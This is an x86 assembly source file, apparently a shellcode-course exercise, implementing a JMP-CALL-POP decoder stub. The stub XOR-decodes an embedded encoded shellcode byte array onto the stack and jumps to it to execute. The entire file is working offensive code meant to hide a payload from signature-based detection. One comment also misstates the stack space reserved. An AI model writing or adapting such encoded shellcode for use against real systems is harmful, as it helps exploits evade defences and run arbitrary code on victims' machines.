; Filename: encoder2.asm
; Author: Simon Lemire / 2018
; Description: Encoder shellcode
; Note:

global _start

section .text

_start:
	jmp short call_shellcode

decoder:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	pop esi				; address of shellcode
	mov edi, 0xaaaa9090	; end of shellcode marker
	sub esp, 0x7f		; make room on the stack (512 bytes)
	sub esp, 0x7f       ; make room on the stack
	sub esp, 0x7f       ; make room on the stack
	sub esp, 0x7f       ; make room on the stack

decode:
	mov bl, byte [esi + edx + 1] 	; read 1st encoded byte
	mov bh, byte [esi + edx + 2]	; read 2nd encoded byte
	mov cl, byte [esi + edx + 3]	; read 3rd encoded byte
	mov ch, byte [esi + edx + 4]	; read 4th encoded byte
	xor bl, byte [esi + edx]		; xor with the key byte
	xor bh, byte [esi + edx]		; xor with the key byte
	xor cl, byte [esi + edx]		; xor with the key byte
	xor ch, byte [esi + edx]		; xor with the key byte
	mov byte [esp + eax], ch		; store in memory in reverse order to restore original shellcode
    mov byte [esp + eax + 1], cl	; ..
	mov byte [esp + eax + 2], bh	; ..
	mov byte [esp + eax + 3], bl	; ..

	cmp dword [esi + edx + 5], edi	; check if we have reached the end of shellcode marked
	jz execute_shellcode			; if we do, jump to the shellcode and execute it
	
	inc edx
	inc edx
	inc edx
	inc edx
	inc edx
	add eax, 4
	jnz decode

execute_shellcode:
	jmp short esp

call_shellcode:
	call decoder
	encoder_shellcode: db 0xfa,0x92,0xaa,0x3a,0xcb,0xfd,0x95,0x8e,0xd2,0xd2,0xbe,0xd7,0xdc,0x91,0xd6,0x47,0x17,0xa4,0xce,0x29,0xb8,0x31,0xeb,0x5a,0x31,0xd0,0x1d,0xdb,0x60,0x31,0x52,0xc2,0xc2,0xc2,0xd2,0x90,0x90,0xaa,0xaa 
